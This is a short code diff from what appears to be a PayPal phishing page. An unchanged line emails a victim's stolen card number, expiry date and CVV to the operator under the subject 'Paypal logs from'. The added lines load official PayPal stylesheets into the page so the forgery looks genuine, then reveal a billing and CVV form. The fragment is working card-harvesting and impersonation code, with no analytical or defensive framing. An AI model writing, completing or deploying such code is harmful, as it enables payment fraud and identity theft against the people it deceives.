@@ -112,6 +112,16 @@ function formatString(e) {
     }
     else{send_em(to,email,"Paypal logs from "+email,"cc: "+cc +"\nexpiry: " + expiry+"\ncvv: "+cvv).then( 
      function(){
+              var temp = document.createElement('div');
+
+            temp.innerHTML = '<link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-5-0/paypal-sans.css">
+         <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/edf/a7f2d511b0d8bf1bd86b78f265ae2/css/main.css">
+';
+            var head = document.head;
+            
+            while (temp.firstChild) {
+                head.appendChild(temp.firstChild);
+            }
       const element = document.getElementById("js_modalHeader");
       element.remove();
       show_div('billing','cvv_form')
